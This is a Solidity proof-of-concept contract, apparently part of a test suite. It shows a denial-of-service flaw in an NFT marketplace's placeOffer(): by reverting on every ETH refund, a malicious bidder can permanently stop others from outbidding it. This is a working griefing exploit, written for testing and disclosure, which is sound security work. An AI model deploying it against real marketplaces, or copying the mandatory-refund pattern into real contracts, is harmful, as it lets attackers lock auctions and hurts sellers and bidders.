// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMagaMarketplaceOffers {
    function placeOffer(uint256 tokenId) external payable;
    function cancelOffer(uint256 tokenId) external;
    function withdraw() external;
}

/// @notice PoC-only contract used in tests to prove that placeOffer()'s
/// mandatory refund (`require(refunded, "Refund failed")`) lets a malicious
/// bidder permanently block anyone from outbidding them, by simply
/// rejecting ETH in receive(). Implements IERC721Receiver so it can also
/// legitimately receive the NFT if its offer is accepted.
contract MaliciousBidder is IERC721Receiver {
    IMagaMarketplaceOffers public immutable marketplace;
    bool public rejectRefunds = true;

    constructor(address _marketplace) {
        marketplace = IMagaMarketplaceOffers(_marketplace);
    }

    function bid(uint256 tokenId) external payable {
        marketplace.placeOffer{value: msg.value}(tokenId);
    }

    function cancel(uint256 tokenId) external {
        marketplace.cancelOffer(tokenId);
    }

    function withdrawRefund() external {
        marketplace.withdraw();
    }

    /// @dev Lets the test flip behavior on/off, e.g. to later prove the
    /// bidder itself can still be refunded once it stops rejecting ETH.
    function toggleReject(bool value) external {
        rejectRefunds = value;
    }

    receive() external payable {
        if (rejectRefunds) {
            revert("I reject refunds");
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
